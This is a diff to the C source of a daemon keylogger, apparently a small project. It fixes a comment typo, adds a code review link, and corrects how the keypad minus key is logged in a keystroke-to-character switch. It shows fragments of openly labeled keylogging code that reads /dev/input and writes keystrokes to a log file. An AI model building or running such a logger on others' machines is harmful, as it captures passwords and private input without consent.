@@ -5,9 +5,9 @@
  * Implement a daemon program that acts as a keylogger, reading keystrokes and writes them to a log file for parsing
  * Program Desc:
  * First, detaches the program from CML to run as a daemon. Then, creates a "keylogger.log" file for the keylogging.
- * This program utilizes the linux "dev/input/eventX" to get keystroke information, which is then parsed and written to the create keylogging file.
+ * This program utilizes the linux "dev/input/eventX" to get keystroke information, which is then parsed and written to the created keylogging file.
  * Last Modified: 4/4/23
- * Code Review Link 
+ * Code Review Link https://drive.google.com/file/d/1wKhfu0vcA2PTVY9eQGolbg8vHNRidGey/view?usp=sharing
  */
 
 /* includes */
@@ -163,10 +163,10 @@ void write_to_log(struct input_event data, FILE *logfile){
     case KEY_0: case KEY_KP0:
       input = "0\n";
       break;
-    case KEY_MINUS:
+    case KEY_MINUS: case KEY_KPMINUS:
       input = "-\n";
       break;
-    case KEY_EQUAL: case KEY_KPMINUS:
+    case KEY_EQUAL:
       input = "=\n";
       break;
     case KEY_BACKSPACE:
